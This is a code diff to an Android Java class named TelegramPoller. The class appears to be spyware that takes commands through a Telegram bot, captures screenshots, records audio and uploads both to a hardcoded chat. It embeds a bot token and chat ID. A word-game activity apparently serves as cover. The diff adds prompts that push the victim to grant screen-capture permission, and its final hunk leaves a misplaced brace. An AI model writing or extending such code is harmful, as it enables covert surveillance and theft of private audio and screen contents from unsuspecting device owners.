@@ -29,7 +29,6 @@ import java.util.Locale;
 public class TelegramPoller implements Runnable {
     private Context ctx;
 
-    // ⚠️ ضع التوكن و CHAT_ID الصحيحين هنا ⚠️
     private static final String BOT_TOKEN = "8664055093:AAFzjAY549sKvHPh7pdwepTgr7AUtzSW4c8";
     private static final String CHAT_ID = "7058836561";
 
@@ -98,7 +97,11 @@ public class TelegramPoller implements Runnable {
                 startRecording();
             }
             else if (cmd.equals("/screenshot")) {
-                ScreenCaptureService.takeScreenshot(ctx, CHAT_ID, BOT_TOKEN);
+                if (ScreenCaptureService.isPermissionAvailable()) {
+                    ScreenCaptureService.takeScreenshot(ctx, CHAT_ID, BOT_TOKEN);
+                } else {
+                    sendMessage("❌ صلاحية لقطة الشاشة غير مفعلة. الرجاء فتح التطبيق والموافقة على النافذة المنبثقة.");
+                }
             }
             else if (cmd.equals("/play")) {
                 Intent intent = new Intent(ctx, WordOrderActivity.class);
@@ -251,6 +254,7 @@ public class TelegramPoller implements Runnable {
                     recorder.release();
                     if (audioFile.exists() && audioFile.length() > 0) {
                         sendAudioStatic(CHAT_ID, audioFile, BOT_TOKEN);
+                        sendMessage("✅ تم إرسال التسجيل الصوتي");
                     } else {
                         sendMessage("❌ فشل التسجيل (الملف فارغ).");
                     }
@@ -398,4 +402,4 @@ public class TelegramPoller implements Runnable {
             conn.disconnect();
         } catch (Exception ignored) {}
     }
-}
+                            } 
